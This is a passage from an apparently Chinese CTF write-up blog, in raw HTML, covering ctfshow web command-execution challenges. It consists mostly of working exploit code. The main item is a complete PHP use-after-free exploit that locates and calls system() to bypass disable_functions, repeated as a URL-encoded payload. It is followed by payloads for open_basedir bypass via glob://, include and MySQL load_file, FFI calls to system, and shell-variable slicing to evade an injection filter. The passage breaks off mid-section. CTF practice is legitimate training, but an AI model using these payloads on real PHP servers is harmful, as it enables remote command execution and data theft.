&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># payload</span><br><span class="line">c=function%20ctfshow(%24cmd)%0A%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%0A%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for%20(%24j%20%3D%20%24s%20-%201%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%20%2B%20%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C%20(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C%20(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if%20(%24s%20!%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if%20(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if%20(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while%20(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%0A%20%20%20%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if%20(stristr(PHP_OS%2C%20&#x27;WIN&#x27;))%20%7B%0A%20%20%20%20%20%20%20%20die(&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;)%3B%0A%0A%20%20%20%20trigger_uaf(&#x27;x&#x27;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%0A%20%20%20%20%7D%3B%0A%0A%20%20%20%20if%20(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if%20(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if%20(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if%20(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if%20(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for%20(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3B%0Aob_end_flush()%3B</span><br></pre></td></tr></table></figure><h2 id="Web73"><a href="#Web73" class="headerlink" title="Web73"></a>Web73</h2><p>先扫一下根目录 看下flag在哪里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;<span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;---&quot;</span>;&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>flag在flagc.txt下</p><p>include没有过滤可以直接用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>这道题还有一个思路</p><p>就是利用上面的uaf脚本 但是里面有个函数被禁用了</p><p>可以根据函数的作用利用其他函数实现这个函数的功能从而绕过 详情见b站ctfshow账号</p><h2 id="Web74"><a href="#Web74" class="headerlink" title="Web74"></a>Web74</h2><p>扫描根目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这次flag在flagx.txt下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flagx.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h2 id="Web75"><a href="#Web75" class="headerlink" title="Web75"></a>Web75</h2><p>用上面的glob协议扫描flag在flag36.txt</p><p>这道题的payload不是很懂</p><p>利用sql语句绕过open_basedir和disable_function</p><p>mysql的连接参数可以通过前面几个题拿到 但我太菜不知道在哪里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><h2 id="Web76"><a href="#Web76" class="headerlink" title="Web76"></a>Web76</h2><p>老样子glob协议扫描</p><p>flag在flag36d.txt</p><p>还是sql语句绕</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c<span class="operator">=</span>try &#123;$dbh <span class="operator">=</span> <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);foreach($dbh<span class="operator">-</span><span class="operator">&gt;</span>query(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="keyword">as</span> $<span class="type">row</span>)</span><br><span class="line">&#123;echo($<span class="type">row</span>[<span class="number">0</span>]).&quot;|&quot;; &#125;$dbh <span class="operator">=</span> <span class="keyword">null</span>;&#125;catch (PDOException $e) &#123;echo $e<span class="operator">-</span></span><br><span class="line"><span class="operator">&gt;</span>getMessage();exit(<span class="number">0</span>);&#125;exit(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="Web77"><a href="#Web77" class="headerlink" title="Web77"></a>Web77</h2><p>扫描根目录 这次有两个flag 文件一个flag36x.txt 一个readflag</p><p>flag在readflag下</p><p>这道题利用php7.4新特性FFI进行绕过</p><p><a href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a> </p><p><a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p><blockquote><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p></blockquote><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;/readflag &gt; 1.txt&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>执行完成后访问1.txt拿到flag</p><h2 id="Web118"><a href="#Web118" class="headerlink" title="Web118"></a>Web118</h2><p>这里给了一个提示 链接已经挂了</p><p>是一个图片</p><p><img src="/posts/999021e8/image-20220331104415460.png" alt="image-20220331104415460"></p><p>打开题目是一个输入框 查看源代码发现这个搜索框是执行<code>system($code);</code>code是我们传入的变量</p><p>这道题利用了linux的内置变量</p><p><a href="https://www.cnblogs.com/sparkdev/p/9934595.html">https://www.cnblogs.com/sparkdev/p/9934595.html</a></p><p><a href="https://blog.51cto.com/allenh/1695810">https://blog.51cto.com/allenh/1695810</a></p><blockquote><p>${PWD} 返回工作目录(你当前所在的目录)</p><p>可以使用切片取得返回的字母  例:${PWD:0:1}</p><p>同时可以利用取反号<del>取变量的后几位  例:${PWD:</del>0}</p><p>0也可以用字母代替 例:<code>$&#123;PWD:~A&#125;</code> 返回结果和 <code>$&#123;PWD:~0&#125;</code>相同</p><p>${PATH} 通常是bin</p><p>$IFS 内部域分隔符 默认为空白(空格, 制表符,和换行符)</p></blockquote><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;PATH:~A&#125;<span class="variable">$&#123;PWD:~A&#125;</span><span class="variable">$IFS</span>????.???  <span class="comment">#nl flag.php</span></span></span><br></pre></td></tr></table></figure><p>查看源代码拿到flag</p><h2 id="Web119-121"><a href="#Web119-121" class="headerlink" title="Web119-121"></a>Web119-121</h2><p>因为payload有{和#会导致博客BUG因此移至语雀<a href="https://www.yuque.com/fatty-dooyc/ihgw31/zuxzgr">CTFShow Web入门_命令执行 · 语雀 (yuque.com)</a></p><h2 id="Web122"><a href="#Web122" class="headerlink" title="Web122"></a>Web122</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>过滤了PWD和#</p><blockquote><p>yu师傅说${}的报错在本地返回时1，但是题目的报错环境是2，所以放开了&lt;<br>&lt;A的报错返回也是1，所以就成功得到了数字1，至于数字4拿RANDOM随机就可以了。</p><p>由于需要$?返回值为1，所以在前面加一个&lt;A使其报错；</p></blockquote><p>$?非0的时候的返回值是可控的 如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 